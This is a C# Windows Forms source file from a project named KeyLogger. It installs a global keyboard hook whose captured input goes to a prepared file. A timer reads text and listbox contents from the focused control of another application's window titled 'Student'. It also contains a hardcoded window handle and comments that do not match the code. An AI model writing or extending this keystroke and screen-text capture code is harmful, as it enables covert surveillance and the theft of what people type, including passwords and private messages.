﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    public class Class1
    {
        [DllImport("user32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public static extern int RegisterWindowMessage(string lpString);

        [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = System.Runtime.InteropServices.CharSet.Auto)] //
        public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

        const int WM_GETTEXT = 0x000D;
        const int WM_GETTEXTLENGTH = 0x000E;

        public void RegisterControlforMessages()
        {
            RegisterWindowMessage("WM_GETTEXT");
        }
        public string GetControlText(IntPtr hWnd)
        {

            StringBuilder title = new StringBuilder();

            // Get the size of the string required to hold the window title. 
            Int32 size = SendMessage((int)hWnd, WM_GETTEXTLENGTH, 0, 0).ToInt32();

            // If the return is 0, there is no title. 
            if (size > 0)
            {
                title = new StringBuilder(size + 1);

                SendMessage(hWnd, (int)WM_GETTEXT, title.Capacity, title);


            }
            return title.ToString();
        }
    }

    public partial class MainForm : Form
    {
        Analyzer analyzer = new Analyzer();

        # region Data Members & Structures



        [StructLayout(LayoutKind.Sequential)]    // Required by user32.dll
        public struct RECT
        {
            public uint Left;
            public uint Top;
            public uint Right;
            public uint Bottom;
        };

        [StructLayout(LayoutKind.Sequential)]    // Required by user32.dll
        public struct GUITHREADINFO
        {
            public uint cbSize;
            public uint flags;
            public IntPtr hwndActive;
            public IntPtr hwndFocus;
            public IntPtr hwndCapture;
            public IntPtr hwndMenuOwner;
            public IntPtr hwndMoveSize;
            public IntPtr hwndCaret;
            public RECT rcCaret;
        };

        Point startPosition = new Point();       // Point required for ToolTip movement by Mouse
        GUITHREADINFO guiInfo;                     // To store GUI Thread Information
        Point caretPosition;                     // To store Caret Position  


        # endregion

        # region DllImports



        /*- Retrieves information about active window or any specific GUI thread -*/
        [DllImport("user32.dll", EntryPoint = "GetGUIThreadInfo")]
        public static extern bool GetGUIThreadInfo(uint tId, out GUITHREADINFO threadInfo);

        /*- Retrieves Handle to the ForeGroundWindow -*/
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        /*- Converts window specific point to screen specific -*/
        [DllImport("user32.dll")]
        public static extern bool ClientToScreen(IntPtr hWnd, out Point position);



        [DllImport("user32.dll")]
        static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);

        [DllImport("user32.dll")]
        static extern IntPtr AttachThreadInput(IntPtr idAttach, IntPtr idAttachTo, bool fAttach);

        [DllImport("user32.dll")]
        static extern IntPtr GetFocus();


        # endregion


        #region DllImports Window Text


        /*- Retrieves Title Information of the specified window -*/
        [DllImport("user32.dll")]
        static extern int GetWindowText(int hWnd, StringBuilder text, int count);

        /*- Retrieves Id of the thread that created the specified window -*/
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(int hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetListBoxInfo(IntPtr hWnd);

        #endregion


        public MainForm()
        {
            InitializeComponent();
        }

        private const uint GA_ROOT = 2;

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }



        private void button1_Click(object sender, EventArgs e)
        {
            analyzer.PrepareFile();
            AnchorKeyboard.CreateHook(analyzer.ProcessHook);
        }

        private void StopCatcher_Click(object sender, EventArgs e)
        {
            AnchorKeyboard.DestroyHook();
            analyzer.ActionFlush();
        }





        private void MainForm_MouseMove(object sender, MouseEventArgs e)
        {

        }
        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hwnd, ref Rect rectangle);

        [DllImport("user32.dll")]
        static extern IntPtr SendDlgItemMessage(IntPtr hDlg, int nIDDlgItem, uint Msg,
           UIntPtr wParam, IntPtr lParam);

        public struct Rect
        {
            public int Left { get; set; }
            public int Top { get; set; }
            public int Right { get; set; }
            public int Bottom { get; set; }

            public int Width { get; set; }

            public int Height { get; set; }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);

        [DllImport("user32.dll")]
        private static extern int SendMessage(IntPtr hWnd, uint Msg, out int wParam, out int lParam);

        const int LB_GETCOUNT = 0x018B;
        const int LB_GETTEXT = 0x0189;
        const int LB_SETCURSEL = 0x0186;
        const int LB_FINDSTRING = 13;
        const uint WM_GETTEXTLENGTH = 0x000E;
        const uint WM_GETTEXT = 0x000D;
        const uint EM_GETSEL = 0xB0;

        private List<string> GetListBoxContents(IntPtr listBoxHwnd)
        {
            int cnt = (int)SendMessage(listBoxHwnd, LB_GETCOUNT, IntPtr.Zero, null);
            int selectedindex = (int)SendMessage(listBoxHwnd, (uint)LB.LB_GETCURSEL, IntPtr.Zero, null);
            List<string> listBoxContent = new List<string>();
            if (cnt > 0)
            {

                for (int i = 0; i < cnt; i++)
                {
                    StringBuilder sb = new StringBuilder(256);
                    IntPtr getText = SendMessage(listBoxHwnd, LB_GETTEXT, (IntPtr)i, sb);
                    listBoxContent.Add(sb.ToString());
                }
            }
            label11.Text = (selectedindex != -1 && listBoxContent.Count != 0) ? listBoxContent[selectedindex].ToString() : "";
            return listBoxContent;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(Point p);

        private delegate bool EnumWindowProc(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        private IntPtr _MainHandle;

        public List<IntPtr> GetAllChildHandles()
        {
            List<IntPtr> childHandles = new List<IntPtr>();

            GCHandle gcChildhandlesList = GCHandle.Alloc(childHandles);
            IntPtr pointerChildHandlesList = GCHandle.ToIntPtr(gcChildhandlesList);

            try
            {
                EnumWindowProc childProc = new EnumWindowProc(EnumWindow);
                EnumChildWindows(this._MainHandle, childProc, pointerChildHandlesList);
            }
            finally
            {
                gcChildhandlesList.Free();
            }

            return childHandles;
        }

        private bool EnumWindow(IntPtr hWnd, IntPtr lParam)
        {
            GCHandle gcChildhandlesList = GCHandle.FromIntPtr(lParam);

            if (gcChildhandlesList == null || gcChildhandlesList.Target == null)
            {
                return false;
            }

            List<IntPtr> childHandles = gcChildhandlesList.Target as List<IntPtr>;
            childHandles.Add(hWnd);
            StringBuilder sb = new StringBuilder(256);
            GetWindowText((int)hWnd, sb, 256);
            // Find window handle
            //label11.Text += sb.ToString();

            return true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            EvaluateCaretPosition();
            Point pt = Cursor.Position;
            lblCurrentApp.Text = AnchorKeyboard.GetCursorText();
            IntPtr handle = IntPtr.Zero;
            handle = GetForegroundWindow();

            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            if (GetWindowText((int)handle, Buff, nChars) > 0)
            {
                if (Buff.ToString().Equals("Student"))
                {
                    IntPtr hWnd = FindWindow(null, "Student"); //Calculator is Windows calc title text
                    StringBuilder sb = new StringBuilder(256);
                    int selectedindex = (int)SendMessage((IntPtr)264988, (int)0x000D, IntPtr.Zero, sb);
                    label12.Text = new Class1().GetControlText(FocusedControlInActiveWindow());
                    Rect NotepadRect = new Rect();
                    GetWindowRect(hWnd, ref NotepadRect);
                    NotepadRect.Width = NotepadRect.Right - NotepadRect.Left + 1;
                    NotepadRect.Height = NotepadRect.Bottom - NotepadRect.Top + 1;
                    label1.Text = "Left:" + NotepadRect.Left;
                    label2.Text = "Right:" + NotepadRect.Right;
                    label3.Text = "Top:" + NotepadRect.Top;
                    label4.Text = "Bottom:" + NotepadRect.Bottom;
                    label5.Text = "Width:" + NotepadRect.Width;
                    label6.Text = "Height:" + NotepadRect.Height;

                    // vendor_listbox = FindWindowEx(Client_window, 0&, "ListBox", vbNullString)

                    //IntPtr getText = SendMessage(listBoxHwnd, (uint)LB.LB_GETTOPINDEX, (IntPtr)i, sb);

                    label10.Text = string.Join(",", GetListBoxContents(FocusedControlInActiveWindow()).ToArray());
                    // var a = GetListBoxInfo(WindowFromPoint(point));



                    label9.Text = (((caretPosition.X > NotepadRect.Left) ? (caretPosition.X - NotepadRect.Left) : (NotepadRect.Left - caretPosition.X)) + ((caretPosition.Y > NotepadRect.Top) ? (caretPosition.Y - NotepadRect.Top) : (NotepadRect.Top - caretPosition.Y))).ToString();
                }
            }
        }

        private IntPtr FocusedControlInActiveWindow()
        {
            IntPtr activeWindowHandle = GetForegroundWindow();

            IntPtr activeWindowThread = GetWindowThreadProcessId(activeWindowHandle, IntPtr.Zero);
            IntPtr thisWindowThread = GetWindowThreadProcessId(this.Handle, IntPtr.Zero);

            AttachThreadInput(activeWindowThread, thisWindowThread, true);
            IntPtr focusedControlHandle = GetFocus();
            AttachThreadInput(activeWindowThread, thisWindowThread, false);

            return focusedControlHandle;
        }

        public void EvaluateCaretPosition()
        {
            caretPosition = new Point();

            // Fetch GUITHREADINFO
            GetCaretPosition();

            caretPosition.X = (int)guiInfo.rcCaret.Left + 25;
            caretPosition.Y = (int)guiInfo.rcCaret.Bottom + 25;

            ClientToScreen(guiInfo.hwndCaret, out caretPosition);

            label7.Text = "Control X:" + caretPosition.X.ToString();
            label8.Text = "Control Y:" + caretPosition.Y.ToString();


        }

        /// <summary>
        /// Get the caret position
        /// </summary>
        public void GetCaretPosition()
        {
            guiInfo = new GUITHREADINFO();
            guiInfo.cbSize = (uint)Marshal.SizeOf(guiInfo);

            // Get GuiThreadInfo into guiInfo
            GetGUIThreadInfo(0, out guiInfo);
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Process[] remoteAll = Process.GetProcessesByName("notepad", "window7");
            if (remoteAll != null)
            {

            }
        }
    }
}
